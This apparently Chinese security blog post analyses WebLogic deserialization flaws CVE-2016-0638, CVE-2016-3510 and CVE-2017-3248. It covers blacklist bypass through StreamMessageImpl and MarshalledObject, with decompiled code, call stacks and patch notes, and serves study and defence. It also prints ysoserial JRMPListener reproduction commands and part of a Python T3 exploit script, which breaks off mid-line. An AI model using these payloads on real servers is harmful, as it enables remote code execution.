<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> Object <span class="title function_">marshalledObject</span><span class="params">(Object payload)</span> &#123;</span><br><span class="line">    <span class="type">MarshalledObject</span> <span class="variable">marshalledObject</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        marshalledObject = <span class="keyword">new</span> <span class="title class_">MarshalledObject</span>(payload);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> marshalledObject;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>此处将payload封装进了marshalledObject对象，MarshalledObject是Java标准库中的一个类，用于将Java对象序列化为字节数组，并能够在网络上传输或存储在磁盘上，后面步骤和上面一致，对该对象进行序列化</p>
<p>第二：生成的payload如何成功利用<br>在ServerChannelInputStream.resolveClass下断点，使用weblogic_cmd工具向目标发送payload<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230803164045.png"><br>此时的className正是序列化的第一层，指向weblogic.jms.common.StreamMessageImpl，此类名不在黑名单中，故可以绕过isBlackListed方法</p>
<p>之所以采用StreamMessageImpl，是<strong>因为当StreamMessageImpl类的readExternal执行时，会反序列化传入的参数并调用该参数反序列化后对应类的这个readObject方法</strong><br>在StreamMessageImpl类中的readExternal下断点<br>函数调用栈：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">readExternal:<span class="number">1396</span>, StreamMessageImpl (weblogic.jms.common)</span><br><span class="line">readExternalData:<span class="number">1835</span>, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:<span class="number">1794</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject0:<span class="number">1348</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject:<span class="number">370</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject:<span class="number">69</span>, InboundMsgAbbrev (weblogic.rjvm)</span><br><span class="line">read:<span class="number">41</span>, InboundMsgAbbrev (weblogic.rjvm)</span><br><span class="line">readMsgAbbrevs:<span class="number">283</span>, MsgAbbrevJVMConnection (weblogic.rjvm)</span><br><span class="line">init:<span class="number">215</span>, MsgAbbrevInputStream (weblogic.rjvm)</span><br><span class="line">dispatch:<span class="number">498</span>, MsgAbbrevJVMConnection (weblogic.rjvm)</span><br><span class="line">dispatch:<span class="number">330</span>, MuxableSocketT3 (weblogic.rjvm.t3)</span><br><span class="line">dispatch:<span class="number">394</span>, BaseAbstractMuxableSocket (weblogic.socket)</span><br><span class="line">readReadySocketOnce:<span class="number">960</span>, SocketMuxer (weblogic.socket)</span><br><span class="line">readReadySocket:<span class="number">897</span>, SocketMuxer (weblogic.socket)</span><br><span class="line">processSockets:<span class="number">130</span>, PosixSocketMuxer (weblogic.socket)</span><br><span class="line">run:<span class="number">29</span>, SocketReaderRequest (weblogic.socket)</span><br><span class="line">execute:<span class="number">42</span>, SocketReaderRequest (weblogic.socket)</span><br><span class="line">execute:<span class="number">145</span>, ExecuteThread (weblogic.kernel)</span><br><span class="line">run:<span class="number">117</span>, ExecuteThread (weblogic.kernel)</span><br></pre></td></tr></table></figure>

<p>该函数如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">readExternal</span><span class="params">(ObjectInput var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="built_in">super</span>.readExternal(var1);</span><br><span class="line">    <span class="type">byte</span> <span class="variable">var2</span> <span class="operator">=</span> var1.readByte();</span><br><span class="line">    <span class="type">byte</span> <span class="variable">var3</span> <span class="operator">=</span> (<span class="type">byte</span>)(var2 &amp; <span class="number">127</span>);</span><br><span class="line">    <span class="keyword">if</span> (var3 &gt;= <span class="number">1</span> &amp;&amp; var3 &lt;= <span class="number">3</span>) &#123;</span><br><span class="line">        <span class="keyword">switch</span> (var3) &#123;</span><br><span class="line">            <span class="comment">// 如果消息类型为1，则表示该消息是一个普通的消息。该方法将从ObjectInput中读取PayloadStream对象，并将其用ObjectInputStream进行反序列化，最后将反序列化后的Java对象通过writeObject方法写入消息中</span></span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                <span class="comment">// 从ObjectInput对象中读取PayloadStream对象，并将其作为InputStream对象传递给createPayload方法</span></span><br><span class="line">                <span class="built_in">this</span>.payload = (PayloadStream)PayloadFactoryImpl.createPayload((InputStream)var1);</span><br><span class="line">                <span class="comment">// 将从PayloadStream对象中获取一个BufferInputStream对象，并将其作为参数传递给ObjectInputStream类的构造函数</span></span><br><span class="line">                <span class="type">BufferInputStream</span> <span class="variable">var4</span> <span class="operator">=</span> <span class="built_in">this</span>.payload.getInputStream();</span><br><span class="line">                <span class="type">ObjectInputStream</span> <span class="variable">var5</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(var4);</span><br><span class="line">                <span class="built_in">this</span>.setBodyWritable(<span class="literal">true</span>);</span><br><span class="line">                <span class="built_in">this</span>.setPropertiesWritable(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">                        <span class="built_in">this</span>.writeObject(var5.readObject());</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (EOFException var9) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="built_in">this</span>.reset();</span><br><span class="line">                        <span class="built_in">this</span>.setPropertiesWritable(<span class="literal">false</span>);</span><br><span class="line">                        <span class="type">PayloadStream</span> <span class="variable">var7</span> <span class="operator">=</span> <span class="built_in">this</span>.payload.copyPayloadWithoutSharedStream();</span><br><span class="line">                        <span class="built_in">this</span>.payload = var7;</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (JMSException var8) &#123;</span><br><span class="line">                        JMSClientExceptionLogger.logStackTrace(var8);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (MessageNotWriteableException var10) &#123;</span><br><span class="line">                    JMSClientExceptionLogger.logStackTrace(var10);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (javax.jms.MessageFormatException var11) &#123;</span><br><span class="line">                    JMSClientExceptionLogger.logStackTrace(var11);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (JMSException var12) &#123;</span><br><span class="line">                    JMSClientExceptionLogger.logStackTrace(var12);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="comment">//如果消息类型为3，则表示该消息是一个压缩消息。如果消息的高位字节不为0，则表示消息是经过压缩的，该方法将调用readExternalCompressedMessageBody方法读取压缩后的消息内容</span></span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                <span class="keyword">if</span> ((var2 &amp; -<span class="number">128</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="built_in">this</span>.readExternalCompressedMessageBody(var1);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="comment">// 如果消息类型为2，则表示该消息是一个流消息。该方法将从ObjectInput中读取PayloadStream对象，并将其作为消息的PayloadStream对象进行设置</span></span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                <span class="built_in">this</span>.payload = (PayloadStream)PayloadFactoryImpl.createPayload((InputStream)var1);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> JMSUtilities.versionIOException(var3, <span class="number">1</span>, <span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中var4是正常反序列化后的数据<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230803173055.png"><br>其buf的值和第一次payload反序列化后是一样的<br>然后将var4实例化成一个ObjectInputStream对象，即var5，在try中，var5调用了readObject方法，即实现了真实payload的反序列化<br><strong>总结</strong>：<br>绕过原理：先将恶意的反序列化对象封装在StreamMessageImpl对象中，然后再对StreamMessageImpl对象进行反序列化，将生成的payload发送至目标服务器。<br>目标服务器拿到payload字节码后，读取到类名StreamMessageImpl，此类名不在黑名单中，故可以绕过resolveClass中的过滤。在调用StreamMessageImpl的readObject时，底层会调用其readExternal方法，对封装的序列化数据进行反序列化，从而调用恶意类的readObject函数<br><strong>修复</strong>：<br>2016年4月p22505423_1036_Generic发布的补丁<br>在weblogic.jms.common.StreamMessageImpl的readExternal方法创建的ObjectInputStream换成了自定义的FilteringObjectInputStream，并在其中对类进行了过滤，使用网上的一张图<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230812220539.png"></p>
<p><strong>参考</strong>：<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/nice0e3/p/14207435.html">Java安全之Weblogic 2016-0638分析 - nice_0e3 - 博客园 (cnblogs.com)</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8529">CVE-2016-3510:Weblogic反序列化分析</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10173">weblogic漏洞分析之CVE-2016-0638</a></p>
<h3 id="CVE-2016-3510"><a href="#CVE-2016-3510" class="headerlink" title="CVE-2016-3510"></a>CVE-2016-3510</h3><p><strong>漏洞分析</strong>：<br>此漏洞的利用方式与CVE-2016-0638一致，只不过这里不再借助StreamMessageImpl类，而是借助MarshalledObject类<br>继续分析weblogic_cmd代码，结合下面代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">selectBypass</span><span class="params">(Object payload)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (Main.TYPE.equalsIgnoreCase(<span class="string">&quot;marshall&quot;</span>)) &#123;</span><br><span class="line">        payload = marshalledObject(payload);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Main.TYPE.equalsIgnoreCase(<span class="string">&quot;streamMessageImpl&quot;</span>)) &#123;</span><br><span class="line">        payload = streamMessageImpl(Serializables.serialize(payload));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> payload;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>前面提到，TYPE为streamMessageImpl时，会选择StreamMessageImpl作为绕过黑名单的类，而TYPE为marshall时，则选择MarshalledObject作为绕过黑名单的类<br>进入marshalledObject方法，此时传递的参数是恶意的对象</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> Object <span class="title function_">marshalledObject</span><span class="params">(Object payload)</span> &#123;</span><br><span class="line">    <span class="type">MarshalledObject</span> <span class="variable">marshalledObject</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        marshalledObject = <span class="keyword">new</span> <span class="title class_">MarshalledObject</span>(payload);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> marshalledObject;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里将第一层payload作为参数实例化一个MarshalledObject对象并返回，观察MarshalledObject类的构造函数</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">MarshalledObject</span><span class="params">(Object var1)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="keyword">if</span> (var1 == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="built_in">this</span>.hash = <span class="number">13</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 创建一个ByteArrayOutputStream对象var2</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="comment">// 并将其作为参数传递给MarshalledObjectOutputStream类的构造函数，创建一个MarshalledObjectOutputStream对象var3</span></span><br><span class="line">        <span class="type">MarshalledObjectOutputStream</span> <span class="variable">var3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MarshalledObjectOutputStream</span>(var2);</span><br><span class="line">        <span class="comment">// 将传入的Java对象通过var3.writeObject方法序列化为字节流，并通过var3.flush方法刷新输出流</span></span><br><span class="line">        var3.writeObject(var1);</span><br><span class="line">        var3.flush();</span><br><span class="line">        <span class="comment">// 通过var2.toByteArray方法获取字节流的字节数组，并将该字节数组赋值给objBytes属性</span></span><br><span class="line">        <span class="comment">// 重点在这里，目标payload的字节流存放在这当中</span></span><br><span class="line">        <span class="built_in">this</span>.objBytes = var2.toByteArray();</span><br><span class="line">        <span class="type">int</span> <span class="variable">var4</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 计算字节数组的哈希值，并将哈希值赋值给hash属性</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">var5</span> <span class="operator">=</span> <span class="number">0</span>; var5 &lt; <span class="built_in">this</span>.objBytes.length; ++var5) &#123;</span><br><span class="line">            var4 = <span class="number">31</span> * var4 + <span class="built_in">this</span>.objBytes[var5];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">this</span>.hash = var4;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最终恶意的payload存放在MarshalledObject对象的objBytes属性中<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230804112917.png"><br>如何对objBytes读取并调用readObject呢？<br>在MarshalledObject类中存在一个方法readResolve，它能够将属性objBytes的字节流反序列化成Java对象</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">readResolve</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, ObjectStreamException &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.objBytes == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 创建一个ByteArrayInputStream对象var1，并将objBytes属性作为参数传递给它</span></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">var1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(<span class="built_in">this</span>.objBytes);</span><br><span class="line">        <span class="comment">// 创建一个ObjectInputStream对象var2，该对象可以将字节流反序列化为Java对象</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(var1);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">var3</span> <span class="operator">=</span> var2.readObject();</span><br><span class="line">        var2.close();</span><br><span class="line">        <span class="keyword">return</span> var3;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>那么readResolve方法在什么时候调用？<br>继续在InboundMsgAbbrev.class的resolveClass方法和MarshalledObject的readResolve方法下断点，使用weblogic_cmd执行一次<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230804115044.png"><br>这里的类名是MarshalledObject，不在黑名单中，故可以绕过isBlackListed方法的判断<br>继续执行，到下一个断点，执行到MarshalledObject的readResolve方法的调用栈</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">readResolve:<span class="number">56</span>, MarshalledObject (weblogic.corba.utils)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">57</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">601</span>, Method (java.lang.reflect)</span><br><span class="line">invokeReadResolve:<span class="number">1091</span>, ObjectStreamClass (java.io)</span><br><span class="line">readOrdinaryObject:<span class="number">1805</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject0:<span class="number">1348</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject:<span class="number">370</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject:<span class="number">69</span>, InboundMsgAbbrev (weblogic.rjvm)</span><br><span class="line">read:<span class="number">41</span>, InboundMsgAbbrev (weblogic.rjvm)</span><br><span class="line">readMsgAbbrevs:<span class="number">283</span>, MsgAbbrevJVMConnection (weblogic.rjvm)</span><br><span class="line">init:<span class="number">215</span>, MsgAbbrevInputStream (weblogic.rjvm)</span><br><span class="line">dispatch:<span class="number">498</span>, MsgAbbrevJVMConnection (weblogic.rjvm)</span><br><span class="line">dispatch:<span class="number">330</span>, MuxableSocketT3 (weblogic.rjvm.t3)</span><br><span class="line">dispatch:<span class="number">394</span>, BaseAbstractMuxableSocket (weblogic.socket)</span><br><span class="line">readReadySocketOnce:<span class="number">960</span>, SocketMuxer (weblogic.socket)</span><br><span class="line">readReadySocket:<span class="number">897</span>, SocketMuxer (weblogic.socket)</span><br><span class="line">processSockets:<span class="number">130</span>, PosixSocketMuxer (weblogic.socket)</span><br><span class="line">run:<span class="number">29</span>, SocketReaderRequest (weblogic.socket)</span><br><span class="line">execute:<span class="number">42</span>, SocketReaderRequest (weblogic.socket)</span><br><span class="line">execute:<span class="number">145</span>, ExecuteThread (weblogic.kernel)</span><br><span class="line">run:<span class="number">117</span>, ExecuteThread (weblogic.kernel)</span><br></pre></td></tr></table></figure>

<p>这与上面的resolveClass、readExternal方法一样，都是在执行readObject方法的底层执行<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230804115904.png"><br>最后会调用恶意对象的readObject方法，执行CC1链<br><strong>总结</strong>：<br>在Java中，当一个对象被序列化时，会将对象的类型信息和对象的数据一起写入流中。当流被反序列化时，Java会根据类型信息创建对象，并将对象的数据从流中读取出来，然后调用对象中的readObject方法将数据还原到对象中，最终返回一个Java对象。在Weblogic中，当从流量中获取到普通类序列化数据的类对象后，程序会依次尝试调用类对象中的readObject、readResolve、readExternal等方法，以恢复对象的状态。</p>
<p>readObject方法是Java中的一个成员方法，用于从流中读取对象的数据，并将其还原到对象中。该方法可以被对象重写，以实现自定义的反序列化逻辑。</p>
<p>readResolve方法是Java中的一个成员方法，用于在反序列化后恢复对象的状态。当对象被反序列化后，Java会检查对象中是否存在readResolve方法，如果存在，则会调用该方法恢复对象的状态。</p>
<p>readExternal方法是Java中的一个成员方法，用于从流中读取对象的数据，并将其还原到对象中。该方法通常被用于实现Java标准库中的可序列化接口Externalizable，以实现自定义的序列化逻辑。<br><strong>修复</strong>：<br>2016年10月发布的p23743997_1036_Generic补丁<br>在weblogic.corba.utils.MarshalledObject的readResolve方法中创建一个匿名内部类，重写resolveClass方法，加上了黑名单过滤，使用网上的一张图<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230812220110.png"><br><strong>参考</strong>：<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/nice0e3/p/14269444.html">Java安全之Weblogic 2016-3510 分析 - nice_0e3 - 博客园 (cnblogs.com)</a></p>
<h3 id="CVE-2017-3248"><a href="#CVE-2017-3248" class="headerlink" title="CVE-2017-3248"></a>CVE-2017-3248</h3><p><strong>漏洞复现</strong>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">java -<span class="built_in">cp</span> ysoserial-all.jar ysoserial.exploit.JRMPListener 9999 CommonsCollections1 <span class="string">&#x27;touch /tmp/cve-2017-3248&#x27;</span></span><br><span class="line">python cve-2017-3248.py 127.0.0.1 7001 ysoserial-all.jar 127.0.0.1 9999 JRMPClient</span><br><span class="line"></span><br><span class="line"><span class="comment">#在docker中执行</span></span><br><span class="line">/java/bin/java -<span class="built_in">cp</span> ysoserial-all.jar ysoserial.exploit.JRMPListener 9999 CommonsCollections1 <span class="string">&#x27;touch /tmp/cve-2017-3248&#x27;</span></span><br><span class="line">python cve-2017-3248.py 127.0.0.1 7001 ysoserial-all.jar 127.0.0.1 9999 JRMPClient</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230811170709.png"><br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230811170619.png"></p>
<p>最终命令执行成功，在&#x2F;tmp目录下新建了cve-2017-3248文件<br><strong>exp</strong>：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_payload</span>(<span class="params">path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client</span>):</span><br><span class="line">    <span class="comment">#generates ysoserial payload</span></span><br><span class="line">    command = <span class="string">&#x27;java -jar &#123;&#125; &#123;&#125; &#123;&#125;:&#123;&#125; &gt; payload.out&#x27;</span>.<span class="built_in">format</span>(path_ysoserial, jrmp_client, jrmp_listener_ip, jrmp_listener_port)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;command: &quot;</span> + command)</span><br><span class="line">    os.system(command)</span><br><span class="line">    bin_file = <span class="built_in">open</span>(<span class="string">&#x27;payload.out&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">    <span class="keyword">return</span> binascii.hexlify(bin_file)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">t3_handshake</span>(<span class="params">sock, server_addr</span>):</span><br><span class="line">    sock.connect(server_addr)</span><br><span class="line">    sock.send(<span class="string">&#x27;74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a&#x27;</span>.decode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    data = sock.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="built_in">print</span>(data)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;handshake successful&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_t3_request_object</span>(<span class="params">sock, port</span>):</span><br><span class="line">    data1 = <span 